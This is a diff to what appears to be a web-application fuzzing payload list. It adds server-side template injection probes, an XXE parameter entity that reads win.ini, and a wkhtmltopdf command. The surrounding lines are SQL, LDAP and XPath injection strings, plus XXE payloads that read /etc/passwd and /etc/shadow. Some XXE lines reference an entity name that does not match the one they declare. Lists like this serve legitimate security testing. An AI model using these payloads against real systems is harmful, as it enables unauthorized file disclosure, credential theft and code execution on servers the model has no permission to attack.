@@ -409,6 +409,11 @@ INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char
 *(|(objectclass=*))
 %2A%28%7C%28objectclass%3D%2A%29%29
 *()|%26'
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
 admin*
 admin*)((|userPassword=*)
 *)(uid=*))(|(uid=*
@@ -430,3 +435,5 @@ x'+or+name()='username'+or+'x'='y
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+wkhtmltopdf http://google.com google.pdf
